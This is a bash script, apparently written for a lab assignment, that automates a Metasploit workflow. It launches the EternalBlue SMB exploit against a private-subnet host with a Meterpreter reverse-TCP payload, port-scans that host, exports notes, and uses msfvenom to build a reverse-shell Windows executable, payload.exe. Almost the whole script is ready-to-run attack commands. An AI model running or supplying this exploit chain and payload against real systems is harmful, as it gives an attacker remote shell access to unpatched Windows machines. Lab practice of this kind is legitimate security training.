#!/bin/bash

# Metasploit Workflow Script - Parts 2-5
# Properly generates notes.csv and keeps payload.exe

echo "[*] Starting Metasploit workflow..."

# Generate a temporary resource file
cat > msf_commands.rc <<EOF
# Part 2: Basic EternalBlue Exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.145.170
set LHOST 192.168.145.0
set payload windows/x64/meterpreter/reverse_tcp
exploit -j
sleep 5
sessions -l
background

# Part 3: Port Scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.145.170
set PORTS 1-1000
run
back

# Part 5: Documentation
notes -t csv -o /tmp/notes_tmp.csv
loot
hosts
services
exit
EOF

# Run Metasploit with the resource file
msfconsole -q -r msf_commands.rc

# Part 4: Generate payload separately (works better outside msfconsole)
echo "[*] Generating payload.exe..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.145.0 LPORT=4444 -f exe -o payload.exe

# Process the notes file
if [ -f /tmp/notes_tmp.csv ]; then
    echo "[*] Formatting notes.csv..."
    echo "Time,Host,Service,Port,Protocol,Type,Data" > notes.csv
    grep -v '^#' /tmp/notes_tmp.csv | sed '/^$/d' >> notes.csv
    rm /tmp/notes_tmp.csv
else
    echo "[!] Warning: Notes file not generated"
    touch notes.csv  # Create empty file if generation failed
fi

# Clean up
rm msf_commands.rc 2>/dev/null

echo "[*] Workflow completed. Created files:"
echo " - notes.csv (documentation)"
echo " - payload.exe (generated payload)"

